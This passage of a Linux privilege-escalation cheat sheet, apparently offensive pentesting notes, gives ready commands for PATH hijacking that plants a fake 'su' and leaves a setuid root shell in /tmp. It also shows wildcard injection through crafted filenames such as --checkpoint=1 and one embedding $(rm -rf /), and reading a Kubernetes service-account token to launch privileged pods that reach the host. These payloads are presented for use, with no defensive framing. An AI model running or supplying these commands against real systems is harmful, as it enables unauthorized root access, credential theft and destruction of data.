Check for scripts or binaries owned by root but writable by user, and abuse `PATH`:
```bash
find / -perm -o=w -type f 2>/dev/null | grep "/usr/bin"
```
If a root-owned script calls binaries without full path, you can create a malicious binary earlier in `PATH`:
```bash
export PATH=/tmp/malicious:$PATH
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/malicious/su
chmod +x /tmp/malicious/su
# When root runs “su” in script, it executes /tmp/malicious/su
/tmp/rootbash -p  # drop into root shell
```
Wildcard Injection: If a script uses wildcards like `cp *.txt /root/backup/`, place a file named `--help` or `-rf` to inject options:
```bash
echo "malicious" > --help
mkdir -p /tmp/backupdir
cp --help /tmp/backupdir      # Might treat “--help” as an option
```

- If a script does something like tar -cf backup.tar `*`, place a malicious file named --checkpoint=1 to inject tar’s options, or use symlinks to overwrite files.
- If a script uses for f in `*`; do somecommand $f; done, create a filename like $(rm -rf /). Use IFS or manipulate environmental variables to change how expansions occur.
**Kubernetes Inside Container**
If `kubectl` or a service account token is present, you may be able to create privileged pods or mount the host:
```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl run --rm -it --image=alpine debug -- /bin/sh
```
If you can define a pod with `hostPID: true` and `privileged: true`, you can namespace-enter the host.
